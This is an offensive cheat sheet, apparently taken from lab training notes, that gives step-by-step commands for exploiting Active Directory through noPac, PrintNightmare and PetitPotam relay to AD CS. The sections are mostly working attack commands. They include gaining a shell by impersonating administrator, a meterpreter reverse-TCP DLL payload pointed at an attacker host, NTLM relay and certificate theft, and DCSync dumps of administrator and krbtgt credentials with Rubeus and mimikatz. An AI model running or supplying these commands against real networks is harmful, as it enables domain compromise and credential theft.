# Recent Vulnerabilites

## NoPac [(SamAccountName Spoofing](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699))
- [Attack outline](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware)
- [noPac Tool on Github](https://github.com/Ridter/noPac)

``` bash
# Scanner
# Tries to get a TGT from the DC and checks to see that `ms-DS-MachineAccountQuota` is not zero. 
sudo python3 scanner.py DOMAIN.local/user:pass -dc-ip <DC-IP> -use-ldap

# Getting a shell
# nopac uses smbexec for shells which is likely to get picked up by EDR if default
sudo python3 noPac.py DOMAIN.LOCAL/user:pass -dc-ip <DC-IP>  -dc-host DCNAME -shell --impersonate administrator -use-ldap

# DCSync
sudo python3 noPac.py DOMAIN.LOCAL/user:pass -dc-ip <DC-IP>  -dc-host DCNAME -shell --impersonate administrator -use-ldap -dump -just-dc-user DOMAIN/administrator
```
___

## PrintNightmare

[cube0x0's](https://twitter.com/cube0x0?lang=en) exploit
``` bash
# setup
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket && cd impacket
python3 ./setup.py install

# Enumerate for MS-RPRN
rpcdump.py @<IP> | egrep 'MS-RPRN|MS-PAR'

# Generate DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll

# Host payload on smb share
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# Start exploit handler

# Run the exploit
sudo python3 CVE-2021-1675.py DOMAIN.local/<username>:<password>@<IP> '\\10.129.202.111\CompData\backupscript.dll'
```
___

## PetitPotam (MS-EFSRPC)
- [Attack Overview](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
- Powershell Implementation: [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1)
- Mimikatz: `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`

##### 0. Find the required info
- We need to start ntlmrelax.py on our attack host. We need to specify the:
    - Web Enrollment URL for the CA host and
    - Use either the KerberosAuthentication or DomainController AD CS template.
    - If we don't know the location of the CA we can use a tool like [certi](https://github.com/zer1t0/certi) to attempt to locate it.

##### 1. Start NTLM Relay
``` bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

##### 2. Run petitpotam.py
``` bash
# In a different console session
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

##### 3. Catch Base64 Encoded Cert for DC01
- This should happen in NTLM relay

##### 4. Request TGT
``` bash
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <Base64 Cert> dc01.ccache
```

##### 5. Set Kerberos Environment Variable
``` bash
export KRB5CCNAME=dc01.ccache
```

##### 6. Use DC TGT to DCSync
``` bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
____

### Alternate Method 1

#### Submit a TGS Request for Ourselves using getnthash.py )

```bash
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the [Privileged Attribute Certificate (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.

#### Use DC NTLM Hash to DCSync

```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

---

### Alternate Method 2

- We can use Rubeus after we get the base64 cert with ntlmrelay to request a TGT and PTT all at once.

#### Request TGT and Performing PTT with DC01$ Machine Account

```powershell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<base64cert> /ptt
```

- We can then use `klist` to make sure the ticket is in memory.
___

#### Perform DCSync with Mimikatz

```powershell
.\mimikatz.exe

mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
```

- Since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host.